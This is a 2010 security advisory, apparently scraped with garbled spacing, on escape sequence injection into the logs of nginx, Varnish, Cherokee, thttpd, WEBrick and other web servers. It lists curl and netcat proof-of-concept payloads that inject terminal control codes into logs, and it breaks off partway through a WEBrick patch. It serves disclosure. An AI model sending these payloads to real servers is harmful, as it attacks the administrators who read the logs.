{
    "text": "title : Nginx , Varnish , Cherokee , etc Log Injection  ， detail : Nginx , Varnish , Cherokee , thttpd , mini-httpd , WEBrick , Orion , AOLserver , Yaws and Boa are subject to log escape sequence injection vulnerabilities.  ， cve : advisories | CVE-2009-4487 , CVE-2009-4488 , CVE-2009-4489 , CVE-2009-4490 , CVE-2009-4491 , CVE-2009-4492 , CVE-2009-4493 , CVE-2009-4494 , CVE-2009-4495 , CVE-2009-4496  ，  ， desc : Nginx , Varnish , Cherokee , thttpd , mini-httpd , WEBrick , Orion , AOLserver ,   ， Yaws and Boa log escape sequence injection  ， Name Nginx , Varnish , Cherokee , thttpd , mini-httpd ,   ， WEBrick , Orion , AOLserver , Yaws and Boa log escape  ， sequence injection  ， Systems Affected nginx 0.7.64  ， Varnish 2.0.6  ， Cherokee 0.99.30  ， mini_httpd 1.19  ， thttpd 2.25b0  ， WEBrick 1.3.1  ， Orion 2.0.7  ， AOLserver 4.5.1  ， Yaws 1.85  ， Boa 0.94.14rc21  ， Severity Medium  ， Impact ( CVSSv2 ) Medium 5/10 , vector :  ( AV : N/AC : L/Au : N/C : P/I : N/A : N )   ， Vendor http : /www.nginx.net/  ， http : /varnish.projects.linpro.no/  ， http : /www.cherokee-project.com/  ， http : /www.ruby-lang.org/  ， http : /www.acme.com/software/thttpd/  ， http : /www.acme.com/software/mini_httpd/  ， http : /www.orionserver.com/  ， http : /www.aolserver.com/  ， http : /yaws.hyber.org/  ， http : /www.boa.org/  ， Advisory http : /www.ush.it/team/ush/hack_httpd_escape/adv.txt  ， Authors Giovanni \"evilaliv3\" Pellerano ( evilaliv3 AT ush DOT it )   ， Alessandro \"jekil\" Tanasi ( alessandro AT tanasi DOT it )   ， Francesco \"ascii\" Ongaro ( ascii AT ush DOT it )   ， Date 20100110  ， I. BACKGROUND  ， nginx is a HTTP and reverse proxy server written by Igor Sysoev.  ， Varnish is a state-of-the-art , high-performance HTTP accelerator.  ， Cherokee is a very fast , flexible and easy to configure Web Server.  ， thttpd is a simple , small , portable , fast , and secure HTTP server.  ， mini_httpd is a small HTTP server.  ， WEBrick is a Ruby library providing simple HTTP web server services.  ， Orion Application Server is a pure java application-server.  ， AOLserver is America Online's Open-Source web server.  ， Yaws is a HTTP high perfomance 1.1 webserver.  ， Boa is a single-tasking HTTP server.  ， II. DESCRIPTION  ， Nginx , Varnish , Cherokee , thttpd , mini-httpd , WEBrick , Orion , AOLserver ,   ， Yaws and Boa are subject to logs escape sequence injection  ， vulnerabilites.  ， Escape sequences are special characters sequences that are used to  ， instruct the terminal to perform special operations like executing  ， commands [ 4 , 5 ] or dumping the buffer to a file [ 6 , 7 ] .  ， When the webserver is executed in foreground in a pty or when the  ， logfiles are viewed with tools like \"cat\" or \"tail\" such control chars  ， reach the terminal and are executed.  ， III. ANALYSIS  ， Summary :   ， A ) \"nginx\" log escape sequence injection  ，  ( Affected versions : 0.7.64 and probably earlier versions )   ， B ) \"Varnish\" log escape sequence injection  ，  ( Affected versions : 2.0.6 and probably earlier versions )   ， C ) \"Cherokee\" log escape sequence injection  ，  ( Affected versions : 0.99.30 and probably earlier versions )   ， D ) \"thttpd\" log escape sequence injection  ，  ( Affected versions : thttpd/2.25b and probably earlier versions )   ， E ) \"mini_httpd\" log escape sequence injection  ，  ( Affected versions : 1.19 and probably earlier versions )   ， F ) \"WEBrick\" log escape sequence injection  ，  ( Affected versions : 1.3.1 and probably earlier versions )   ， G ) \"Orion\" log escape sequence injection  ，  ( Affected versions : 2.0.7 and probably earlier versions )   ， H ) \"AOLserver\" log escape sequence injection  ，  ( Affected versions : 4.5.1 and probably earlier versions )   ， I ) \"Yaws\" log escape sequence injection  ，  ( Affected versions : 1.85 and probably earlier versions )   ， L ) \"Boa\" log escape sequence injection  ，  ( Affected versions : 0.94.14rc21 and probably earlier versions )   ， A ) \"nginx\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， B ) \"Varnish\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， xterm varnishlog  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， C ) \"Cherokee\" log escape sequence injection  ， The following Proof Of Concept can be used in order to verify the  ， vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， D ) \"thttpd\" log escape sequence injection  ， The following Proof Of Concept can be used in order to verify the  ， vulnerability.  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， E ) \"mini_httpd\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， F ) \"WEBrick\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， G ) \"Orion\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， H ) \"AOLserver\" log escape sequence injection  ， The following Proof Of Concept can be used in order to verify the  ， vulnerability.  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， I ) \"Yaws\" log escape sequence injection  ， One of the following two Proofs Of Concept can be used in order to  ， verify the vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， echo -en \"GET /\\x1b ] 2 ; owned?\\x07\\x0a\\x0d\\x0a\\x0d\" > payload  ， nc localhost 80 < payload  ， L ) \"Boa\" log escape sequence injection  ， The following Proof Of Concept can be used in order to verify the  ， vulnerability.  ， curl -kis http : /localhost/%1b%5d%32%3b%6f%77%6e%65%64%07%0a  ， IV. DETECTION  ， Services like Shodan ( shodan.surtri.com ) or Google can be used to get an  ， approximate idea on the usage of the products.  ， Some examples :   ， - http : /shodan.surtri.com/?q=nginx  ， - http : /www.google.com/search?q=\"powered+by+Cherokee\"  ， - curl -kis http : /www.antani.gov | grep -E \"Server : Orion/2.0.8\"  ， V. WORKAROUND  ， Cherokee and WEBrick ( Ruby ) released related security fixes and releases  ， as detailed below.  ， Cherokee issued a public patch that resolved the issue but caused some  ， issues ( http : /svn.cherokee-project.com/changeset/3944 ) and has been  ， later replaced ( http : /svn.cherokee-project.com/changeset/3977 ) by a  ， better fix that both resolve the issue and doesn't affect the normal  ， webserver behavior. Use the second patch or a safe release like 0.99.34  ， or above. If you are using Cherokee 0.99.32 please note that your build  ， uses the first patch.  ， Webrick ( Ruby ) sent us the following patch and issued a release  ， that fixes the issues. Detailed informations are available at the  ， following url :   ， http : /www.ruby-lang.org/en/news/2010/01/10/webrick-escape-sequence-injection  ， The patch we reviewed is the following but please refer to the vendor's  ， article for exact informations.  ， -8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-  ， Index : lib/webrick/httpstatus.rb  ，  ， - lib/webrick/httpstatus.rb ( revision 26065 )   ， + lib/webrick/httpstatus.rb ( working copy )   ，  @ -13 , 5 +13 , 15 @ module WEBrick  ， module HTTPStatus",
    "time": "Jan 11, 2010"
}